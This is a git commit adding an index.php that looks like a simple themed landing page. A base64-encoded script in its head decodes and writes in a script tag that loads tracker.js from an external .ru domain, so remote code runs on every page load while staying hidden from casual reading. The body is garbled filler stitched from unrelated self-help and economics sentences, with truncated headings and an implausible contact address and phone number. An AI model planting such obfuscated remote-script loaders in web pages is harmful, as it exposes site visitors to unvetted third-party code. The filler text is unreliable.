f0a42f1b710396ec9e3beb74e5d4545d8a065662
mcwidsqo <79412312+mcwidsqo@users.noreply.github.com>
2021-02-21 17:45:45 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl95NXpwdGRudmR0NXZ4MnoxZG4iPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>But since in this chapter we are talking about the principles of personal manage</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="t10jk6bn06p3sp39w58t4">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="zwgoet7u0y3su04">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>But since in this chapter we are talking about the principles of personal manage</h1>
+	</section>
+
+
+	<section class="our-work" class="9v3ghaf8enp9ncyjtpgr0">
+		<h3 class="title">People who have not previously exercised have a ten</h3>
+		<p>When such agreements are reached, employees manage themselves, staying within the framework defined by these agreements.  By working in the heart of the Circle of Influence, we are expanding it.  The power of interaction between parts is also manifested in the creation of a synergistic culture within a family or organization.  They are in the Circle of Concern.  Buyers always choose a setthe most satisfying their preferences given the restrictions on income and retail prices.  Why did commodity economy supersede natural economy? First, the number of goods has grown so much that no one can create them on their own.  Under the new system, executives receive money only if their salespeople receive money.  All four of these factors - security, focus, wisdom, and power - are interdependent.  - Nothing of the kind! I said ... </p>
+		<hr>
+
+		<ul class="grid" class="qlpb0yyld3mt3s7he06qv5ky">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="t10jk6bn06p3sp39w58t4">
+		<h3 class="title">He was not blind to the president's weakne</h3>
+		<p>The result of labor can be a material (residential building, parking lot, bridge over a river) or an intangible product (for example, information, service); 2) capital.  And both will feel guilty and unhappy.  The seven skills described in the book are combined into a system.  The father begged, insisted, persuaded.  VAT and strict criteria for entering and exiting a company from the simplified taxation regimewithin the framework of current legislation.  - What do you think to do this weekend? - I do not know.  In other words, if we truly, without any conditions and hidden thoughts, love others, we help others to feel protected, calm, worthy, we strengthen their faith in themselves, in our individuality and the integrity of our personality.  This is due to the fact that agriculture has been the leading sector of the economy for a long period of time. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="zwgoet7u0y3su04" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="9v3ghaf8enp9ncyjtpgr0">
+		<h3 class="title">My home will be a place where my family and I, our friends and </h3>
+		<p>Indeed, without education in our world you cannot go far.  But if we start with a Personal Daily Victory and work from the inside out, the results are bound to appear.  The functioning of this factor of production involves a certain degree of remuneration.  The functions of bodies are usually understood as their specific goals and powers (competence).  This philosophy is reflected to some extent in inspiring and wise sayings such as “Your attitude determines your position,” “A smile has more friends than a frown,” and “You can achieve anything you understand and believe in.” Other areas of the "personal" approach are clearly manipulation or even deception.  Choose one of these actions and write it down as your goal for the coming week. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="qlpb0yyld3mt3s7he06qv5ky" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="t10jk6bn06p3sp39w58t4">
+		<h3 class="title">Father: I help my children to enjoy life and live w</h3>
+		<p>It was obvious that the total depletion of the Emotional Bank Account was creating a culture of low trust.  In the center is a church.  It is associated with both production and spiritual spheres.In accordance with this, the market has the following classification: 1) according to the objects of exchange, the market for goods, the market for services, the capital market, the securities market, the labor market, the foreign exchange market, the market for information and scientific and technical developments; 2) in the territorial context, a local (local) market is distinguished, which is limited to one or several regions of the country; a national market that covers the entire national territory; the world market covering all countries of the world; 3) according to the mechanism of functioning, they are distinguished free (regulated on the basis of free competition of independent producers); monopolized (the conditions of production and circulation are determined by a group of monopolies, between which monopolistic competition persists); regulated (an important role belongs to the state,which uses economic instruments of influence) markets; 4) sometimes a planned-regulated market is also distinguished.  He's only got me in trouble.  Market consumer surplus indicates how much benefit the society as a whole gets from purchasing certain goods at market prices. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="zwgoet7u0y3su04" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="9v3ghaf8enp9ncyjtpgr0">
+		<h3 class="title">People come across more and more objects t</h3>
+		<p>We can help them fulfill their potential, become independent individuals, able to maintain deep, enriching and productive relationships with others.  - Education is important for your future.  In effective personal leadership, the methods of visualizing and creating affirmative attitudes naturally flow from well-thought-out goals and principles that have become the center of an individual's life.  As a result, a negative, zero or positive result is possible (technical, social, economic, etc.).  It is defined as the product of the average price by the number of units sold.  You use accurate data to make your decisions workable and meaningful.  You get what you encourage.  I believe the process is just as important as the end result.  This is the real test of interpersonal leadership.This goes beyond transactional leadership and leads to transformative leadership that changes both the people involved and the relationships.  A firm in a state of bankruptcy is subject to destructuring or liquidation.  You are able to respect both sides of your nature - analytical and creative.You are able to appreciate the differences between them and use them as a catalyst for the creative process.  In the pages of his autobiography, Sadat admits that he almost left his cell with regret, since it was in it that he learned that real success is success in a relationship with oneself.  You can feel it.You can set yourself the task of living in harmony with it. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="qlpb0yyld3mt3s7he06qv5ky" class="title">They are extremely effective in changing the script and reprogr</h3>	
+		<p>Yes, you listen, demonstrating understanding and "reflecting" what is happening, but you listen with the intention of responding, controlling the interlocutor, manipulating him.  Leadership is primarily about energetic activity of the right hemisphere of the brain.  Employment of the economically active population is ensured through the labor market, its inclusion in the sphere of production and in the sphere of services, the possibility of obtaining the necessary earnings is created.  When someone speaks, we usually “listen” at one of four levels.We can ignore the speaker, not listen to him at all. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="t10jk6bn06p3sp39w58t4">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="zwgoet7u0y3su04"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="9v3ghaf8enp9ncyjtpgr0"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="qlpb0yyld3mt3s7he06qv5ky"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>705 Kennedy Walk, Apt. 695, 18974-4325, Feeneyberg, South Dakota, United States</p>
+		<p>Phone number: +032(27)769-05-77508</p>
+	</footer>
+
+</body>
+
+</html>
